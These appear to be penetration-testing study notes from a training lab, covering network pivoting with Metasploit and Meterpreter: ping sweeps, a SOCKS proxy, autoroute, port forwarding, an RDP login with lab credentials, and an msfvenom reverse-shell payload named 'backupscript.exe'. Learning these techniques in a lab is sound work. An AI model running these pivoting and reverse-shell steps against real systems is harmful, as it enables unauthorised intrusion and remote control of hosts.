- If we have a Meterpreter session on the Ubuntu server (the pivot host) we can create a pivot with Meterpreter without relying on SSH port forwarding.


### Ping Sweep

- Assuming the firewall on the windows target allows ICMP requests we could want to pingsweep the subnet to locate it. We can do that using the `ping_sweep` module
``` meterpreter
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
- We can also do these sweeps as for loops directly on a pivot host.

#### Linux Ping Sweep
``` bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
#### CMD Ping Sweep
``` cmd.exe
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
#### Powershell Ping Sweep
``` powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

## Configuring MSF's SOCKS Proxy
- We can use the msf `socks_proxy` module to configure a local proxy on our attack host.
	- We will configure the proxy for `SOCKS version 4a`
``` metasploit
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a, 5)
```
- **Confirm Proxy is Running**
``` metasploit
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```
- After starting the socks server, configure proxychains (`/etc/proxychains.conf`) with the added line `socks4 127.0.0.1 9050`

#### Creating Routes with AutoRoute
- Finally we need to tell the socks proxy to route all traffic via our Meterpreter session.
- We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
### Autoroute from MSF
``` metasploit
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```
#### Autoroute from Meterpreter
``` meterpreter
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes

meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

## Port Forwarding

#### portfwd options
```
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

#### Creating Local TCP Relay
```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```
- The above command requests Meterpreter star a listener on local port (`-l`) `3300` and forward all packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session

#### Connecting to Target through localhost
``` bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

#### Netstat Output
- This allows us to view any sessions a host has established
	- For defensive purposes
``` bash
netstat -antp
```

### Meterpreter Reverse Port Forwarding

- Use to catch shells through the proxy

#### Reverse Port Forwarding Rules
```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```
- For reverse port fwd
	- `-R` reverse
	- `-L` local IP
	- `-l` local port to connect to (our machine)
	- `-p` port to receive requests on pivot

- Start multi/handler
- Generate payload
``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```
- Catch shell!